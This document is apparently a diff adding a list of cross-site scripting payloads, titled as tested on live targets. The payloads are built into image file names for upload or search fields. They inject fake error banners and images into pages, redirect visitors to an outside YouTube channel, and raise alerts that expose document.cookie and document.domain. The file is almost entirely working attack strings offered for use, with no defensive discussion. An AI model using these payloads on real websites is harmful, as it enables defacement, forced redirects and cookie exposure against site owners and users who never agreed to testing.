@@ -1,0 +1,41 @@
+						XSS Bypass Payloads Testing on LIVE TARAGET | POC
+
+XSS with Error Messages:)
+
+    --> '<font color="red">ERROR 1064 (42000): Rohith had made an error in your Search Field;.jpg'
+
+    --> '"><img src=x onerror="document.body.innerHTML += '<div style=\'position:fixed;top:50%;left:50%;transform:translate(-50%, -50%);background-color:red;color:white;padding:20px;border-radius:10px;font-size:20px;z-index:9999;\'>ROHIT</div>';setTimeout(function(){document.querySelector('div').remove();}, 3000);">
+
+    --> '<font color="red">ERROR 1064 (42000): <h1>Rohith had made an error in your  Search Field;.jpg'
+
+
+XSS With Open redirect : )
+   -->  '"><img src=x onerror="window.location.href='https://www.youtube.com/@hackwithrohit-new-2k';">
+
+
+XSS with Image Injection :)
+
+
+   --> '"><img src=x onerror="document.body.innerHTML += '<img src=\'https://yt3.googleusercontent.com/igA5672w3ZWQcEe6OUE8q8-j4llVmEVftgq_EZBOGIva8GAnRmueug2nhUabrNZMH6FnDg6z=s160-c-k-c0x00ffffff-no-rj\' style=\'position:fixed;top:50%;left:50%;transform:translate(-50%, -50%);z-index:9999;border:5px solid red;\'>';">
+
+Classic XSS Alert Payloads :)
+
+
+	'<IFRAME SRC="javascript:alert(document.cookie);">.jpg'
+
+	'"><img src=x onerror=alert('ROHIT')>.jpg'
+
+	'"><img src=x onerror=alert(document.cookie)>.jpg'
+
+	'<img src=x onerror=alert(document.cookie)>.png'
+
+	'<img src=x onerror=alert(document.domain)>.jpg'
+
+	'<img src=x onerror=alert(document.domain)>.png'
+
+	'"><img src=x onerror=prompt(document.cookie)>.jpg'
+
+	'<svg onload=alert(document.cookie)>.jpg'
+
+	'<svg onload=alert(document.domain)>.jpg'
+
